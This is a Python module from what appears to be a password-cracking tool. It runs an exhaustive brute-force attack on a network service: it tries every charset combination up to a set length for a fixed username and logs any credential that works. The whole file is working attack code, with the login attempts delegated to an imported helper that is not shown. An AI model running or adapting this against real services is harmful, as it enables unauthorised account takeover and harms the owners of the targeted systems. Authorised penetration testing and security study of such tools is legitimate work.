"""
Brute Force Attack
==================
Fixed username + charset exhaustion for password.
Iterates every combination from length 1 up to config.max_length.
Uses Rich progress for real-time feedback.
"""
import itertools

from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    BarColumn,
    TaskProgressColumn,
    TimeElapsedColumn,
)

from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig
from modules.attacks.common import attempt, save_result, apply_delay


def run(target: TargetInfo, config: AttackConfig) -> None:
    console.print(
        f"\n[bold primary][ BRUTE FORCE ][/bold primary]\n"
        f"  [muted]Service   :[/muted] [primary]{target.service.upper()}[/primary]\n"
        f"  [muted]Username  :[/muted] [text]{config.username_value}[/text]\n"
        f"  [muted]Charset   :[/muted] [text]{config.charset!r}[/text]\n"
        f"  [muted]Max len   :[/muted] [primary]{config.max_length}[/primary]\n"
        f"  [muted]Delay     :[/muted] [text]{config.delay}s[/text]\n"
    )

    total = sum(
        len(config.charset) ** length
        for length in range(1, config.max_length + 1)
    )

    found    = False
    password = ""
    attempts = 0

    with Progress(
        SpinnerColumn(style="primary"),
        TextColumn("[muted]Trying:[/muted] [text]{task.fields[cred]}[/text]"),
        BarColumn(bar_width=30, style="primary", complete_style="success"),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task_id = progress.add_task(
            "bruteforce",
            total=total,
            cred=f"{config.username_value}:…",
        )

        for length in range(1, config.max_length + 1):
            for combo in itertools.product(config.charset, repeat=length):
                password = "".join(combo)
                attempts += 1
                progress.update(
                    task_id,
                    advance=1,
                    cred=f"{config.username_value}:{password}",
                )
                if attempt(target.host, target.port, config.username_value, password, target.service):
                    found = True
                    break
                apply_delay(config.delay)
            if found:
                break

    if found:
        save_result(target.host, target.port, config.username_value, password, config.log_file, target.service)
        console.print(f"  [muted]Attempts :[/muted] [primary]{attempts}[/primary]")
    else:
        console.print(
            f"\n[error]✗ Exhausted {attempts:,} combinations — no match found.[/error]"
        )
